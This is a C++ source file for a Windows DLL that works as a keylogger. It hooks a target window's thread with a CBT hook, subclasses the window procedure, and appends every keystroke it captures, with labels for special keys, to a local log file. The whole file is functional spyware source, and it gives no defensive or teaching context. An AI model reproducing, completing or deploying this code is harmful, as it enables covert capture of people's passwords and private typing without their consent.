#include <windows.h>
#include <fstream>
using namespace std;


char* FileLocation = "C:\\log\\log.txt";
void writekeys(WPARAM wParam);
bool SpecialKeyMapping(WPARAM wParam, FILE *OUTPUT_FILE);


LRESULT CALLBACK WindowProc(HWND hwnd,UINT uMsg,WPARAM wParam,LPARAM lParam);//Window CallBack Procedure


//Initialized Data to be shared with all instance of the dll
#pragma data_seg("Shared")
HWND hTarget=NULL;
HWND hApp = NULL;
int num=0 ;// Number of the subclassed window handle ,for use in the dll
bool done=FALSE;
HINSTANCE hInstance=NULL;
#pragma data_seg()
// Initialised data End of data share


// Uninitialised Data to be shared with all instance of the dll
#pragma bss_seg("Shared1")
HWND hndll;

long OldWndHndl; //array to store old window handles
BOOL blnsubclassed;
HHOOK hWinHook;
#pragma bss_seg()

//End Uninitialized data

BOOL WINAPI DllMain(
  HANDLE hinstDLL,  // handle to the DLL module
  DWORD fdwReason,     // reason for calling function
  LPVOID lpvReserved   // reserved
)

{

	switch(fdwReason)
	{
	
	case DLL_PROCESS_ATTACH:
		{
			hInstance=(HINSTANCE)hinstDLL;
		}
		break;

	case DLL_PROCESS_DETACH:
		{

		//	UnSubClass();
		//	UnhookWindowsHookEx(hWinHook);

		}
		break;

	}

return TRUE;

}



// Function to set the original window procedure of each subclassed window
int WINAPI UnSubclass()
{	
		if((int)hndll>1)
		{
			// might have to switch to SetwindowLongPtr
			SetWindowLong(hndll,GWL_WNDPROC,OldWndHndl);   //Set back the old window procedure
		}			

		return 1;
}//End UnSubclass function



//The CBT hook Proc(Computer Based Training Hook)
LRESULT CALLBACK CBTProc(int nCode,WPARAM wParam,LPARAM lParam)
{


	if (nCode==HCBT_ACTIVATE)  //Called when the application window is activated
	{
	
		if((HWND)(wParam)==hTarget)  //check if the window activated is Our Targer App
		{   
			
				if (blnsubclassed==FALSE)
				{	
					if(((int)hndll)>1)
					{
						OldWndHndl=SetWindowLong(hndll,GWL_WNDPROC,(long)WindowProc);  //Subclass !!!!
					}
										
					blnsubclassed=TRUE;	// Set state as subclassed
				}

		}		
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}//End of the hook procedure

// Get the handles of the Targetwindow and of the Our application
int WINAPI SetHandle(HWND HandleofTarget ,HWND HandleofApp)
{

	hTarget=HandleofTarget;
	hApp=HandleofApp;
	hWinHook=SetWindowsHookEx(WH_CBT,(HOOKPROC)CBTProc,hInstance,GetWindowThreadProcessId(hTarget,NULL));
	
	
	hndll= HandleofApp; // fill the array with the handle
    blnsubclassed=FALSE;// set the state to not subclassed
	
//	if(hWinHook==NULL)
//		return 0;
//	else
		return 1;

}

//Window Procedures of the subclassed windows
LRESULT CALLBACK WindowProc(
  HWND hwnd,
  UINT uMsg,
  WPARAM wParam,
  LPARAM lParam
)
{
	switch(uMsg)
	{
	  case WM_KEYDOWN:
		  {
			writekeys(wParam);
		  }
	}

	return CallWindowProc((WNDPROC)OldWndHndl,hwnd,uMsg,wParam,lParam);
}


void writekeys(WPARAM wParam)
{
	char ch;			
	FILE *OUTPUT_FILE;
	// a+ option adds to the end of the file without override existing data
	OUTPUT_FILE = fopen(FileLocation, "a+");
	BYTE ks[256];
	GetKeyboardState(ks);
	WORD w;
	if (!SpecialKeyMapping(wParam, OUTPUT_FILE))
	{
	   ToAscii(wParam,0,ks,&w,0);
	   ch =char(w); 
	   fwrite(&ch,1,1,OUTPUT_FILE);
	}
	fclose(OUTPUT_FILE);
}

bool SpecialKeyMapping(WPARAM wParam, FILE *OUTPUT_FILE)
{
	if (LOWORD(wParam)==VK_RETURN)
	 {	
		fprintf(OUTPUT_FILE, "%s", "\n\r");
	 }
	else if (LOWORD(wParam) == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[bksp]");
	else if (LOWORD(wParam) == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "\t");
	else if (LOWORD(wParam) == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[ctrl]");
	else if (LOWORD(wParam) == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[esc]");
	else if (LOWORD(wParam) == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[end]");
	else if (LOWORD(wParam) == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[home]");
	else if (LOWORD(wParam) == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[left]");
	else if (LOWORD(wParam) == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[right]");
	else if (LOWORD(wParam) == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[down]");
	else if (LOWORD(wParam) == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[up]");
	else if (LOWORD(wParam) == VK_CAPITAL)
		fprintf(OUTPUT_FILE, "%s", "[CAPS]");
	else if (LOWORD(wParam) == VK_SHIFT){;}
	
	else 
		return false;
	
	return true;
}